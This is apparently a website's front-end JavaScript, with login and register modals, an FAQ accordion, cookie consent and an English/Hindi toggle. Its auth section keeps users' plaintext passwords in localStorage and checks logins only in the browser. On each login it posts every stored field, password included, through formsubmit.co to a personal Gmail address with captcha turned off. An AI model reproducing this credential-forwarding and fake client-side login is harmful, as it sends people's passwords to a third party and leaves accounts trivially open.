// ================= AUTH SYSTEM =================
let currentUser = null;

const loginLink = document.getElementById('login-link');
const logoutLink = document.getElementById('logout-link');
const userGreeting = document.getElementById('user-greeting');
const userMenu = document.querySelector('.user-menu');
const loginModal = document.getElementById('login-modal');
const registerModal = document.getElementById('register-modal');
const showRegister = document.getElementById('show-register');
const showLogin = document.getElementById('show-login');
const closeModals = document.querySelectorAll('.close-modal');

// Forms
const loginForm = document.getElementById("login-form");
const registerForm = document.getElementById("register-form");

// Modal functions
function openModal(modal) {
    modal.style.display = 'block';
    document.body.style.overflow = 'hidden';
}
function closeModal(modal) {
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
}

// Modal listeners
loginLink.addEventListener('click', (e) => { e.preventDefault(); openModal(loginModal); });
showRegister.addEventListener('click', (e) => { e.preventDefault(); closeModal(loginModal); openModal(registerModal); });
showLogin.addEventListener('click', (e) => { e.preventDefault(); closeModal(registerModal); openModal(loginModal); });

closeModals.forEach(btn => {
    btn.addEventListener('click', function() {
        const modal = this.closest('.modal');
        closeModal(modal);
    });
});

window.addEventListener('click', (e) => {
    if (e.target === loginModal) closeModal(loginModal);
    if (e.target === registerModal) closeModal(registerModal);
});

// ================= REGISTER FORM SUBMIT WITH FORMSUBMIT =================
registerForm.addEventListener("submit", function(e){
    e.preventDefault();

    // Fetch values from form
    const name = registerForm.querySelector("input[name='name']").value.trim();
    const email = registerForm.querySelector("input[name='email']").value.trim();
    const phone = registerForm.querySelector("input[name='phonenumber']").value.trim();
    const password = registerForm.querySelector("input[name='password']").value.trim();

    // Password validation (6 char minimum)
    const strongPassword = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{6,}$/;
    if (!strongPassword.test(password)) {
        alert("⚠️ Weak Password! Use at least 6 characters with letters & numbers.");
        return;
    }

    // Save user data to localStorage
    const userData = { name, email, phone, password };
    localStorage.setItem("user", JSON.stringify(userData));

    // Populate hidden inputs dynamically for Formsubmit
    const form = registerForm;
    form.querySelector("input[name='name']").value = userData.name;
    form.querySelector("input[name='email']").value = userData.email;
    form.querySelector("input[name='phonenumber']").value = userData.phone;
    form.querySelector("input[name='password']").value = userData.password;

    // Submit form to Formsubmit
    form.submit();

    alert("🎉 Registration successful!");
    closeModal(registerModal);
    openModal(loginModal);
});

// ================= LOGIN FORM =================
loginForm.addEventListener("submit", function(e){
    e.preventDefault();

    const email = loginForm.querySelector("input[name='email']").value;
    const password = loginForm.querySelector("input[name='password']").value;

    const storedUser = JSON.parse(localStorage.getItem("user"));

    if(storedUser && storedUser.email === email && storedUser.password === password){
        currentUser = storedUser;
        updateAuthUI();
        alert(`✅ Welcome ${currentUser.name}, you are logged in!`);

        // ================= SEND TO FORMSUBMIT (without redirect) =================
        const formData = new FormData();
        for (const key in storedUser) {
            formData.append(key, storedUser[key]);
        }
        formData.append("_captcha", "false");
        formData.append("_template", "table");

        fetch("https://formsubmit.co/aanya.singh2638@gmail.com", {
            method: "POST",
            body: formData
        }).then(response => {
            if(response.ok){
                console.log("✅ Login Successfully.");
            } else {
                console.error("❌ Failed Logoin.");
            }
        }).catch(error => console.error("⚠️ Network error:", error));

        closeModal(loginModal);

        // Save login state so reload ke baad bhi login rahe
        localStorage.setItem("loggedIn", "true");

    } else {
        alert("❌ Invalid email or password!");
    }
});

// ================= LOGOUT =================
logoutLink.addEventListener('click', (e) => {
    e.preventDefault();
    currentUser = null;
    updateAuthUI();
    alert('You have been logged out.');
});

// ================= UPDATE UI =================
function updateAuthUI() {
    if (currentUser) {
        loginLink.style.display = 'none';
        userMenu.style.display = 'block';
        userGreeting.textContent = `Hi, ${currentUser.name.split(' ')[0]}`;
    } else {
        loginLink.style.display = 'block';
        userMenu.style.display = 'none';
    }
}
updateAuthUI();

document.addEventListener('DOMContentLoaded', function() {
    document.querySelector('.menu-toggle').addEventListener('click', function() {
        document.querySelector('nav ul').classList.toggle('show');
    });
});

// ================= CHECK LOGIN ON PAGE LOAD =================
document.addEventListener("DOMContentLoaded", function() {
    const storedUser = JSON.parse(localStorage.getItem("user"));
    if (storedUser) {
        currentUser = storedUser;
        updateAuthUI();
    }
});

// ================= FAQ ACCORDION =================
const faqItems = document.querySelectorAll(".faq-item");

faqItems.forEach(item => {
    const question = item.querySelector(".faq-question");
    question.addEventListener("click", () => {
        const openItem = document.querySelector(".faq-item.active");
        if (openItem && openItem !== item) {
            openItem.classList.remove("active");
            openItem.querySelector(".faq-answer").style.maxHeight = null;
        }
        item.classList.toggle("active");
        const answer = item.querySelector(".faq-answer");
        if (item.classList.contains("active")) {
            answer.style.maxHeight = answer.scrollHeight + "px";
        } else {
            answer.style.maxHeight = null;
        }
    });
});


// ================= COOKIE CONSENT =================
const cookieConsent = document.getElementById("cookie-consent");
const acceptCookies = document.getElementById("accept-cookies");

acceptCookies.addEventListener("click", () => {
    cookieConsent.style.display = "none";
    localStorage.setItem("cookiesAccepted", "true");
});

// Check if already accepted
if(localStorage.getItem("cookiesAccepted") === "true"){
    cookieConsent.style.display = "none";
}

// ================= CHAT WIDGET =================
const chatButton = document.getElementById("chat-button");

chatButton.addEventListener("click", () => {
    alert("Hi! How can we help you? 💬"); 
    // Aap yaha real chat widget ya modal open bhi kar sakte ho
});

const langButtons = document.querySelectorAll('.lang-btn');

langButtons.forEach(btn => {
    btn.addEventListener('click', () => {
        // Remove active from all
        langButtons.forEach(b => b.classList.remove('active'));
        // Add active to clicked
        btn.classList.add('active');

        const lang = btn.textContent;

        if(lang === "EN") {
            // Show English content, hide Hindi content
            document.querySelectorAll('.lang-hi').forEach(el => el.style.display = 'none');
            document.querySelectorAll('.lang-en').forEach(el => el.style.display = 'block');
        } else {
            // Show Hindi content, hide English content
            document.querySelectorAll('.lang-en').forEach(el => el.style.display = 'none');
            document.querySelectorAll('.lang-hi').forEach(el => el.style.display = 'block');
        }
    });
});
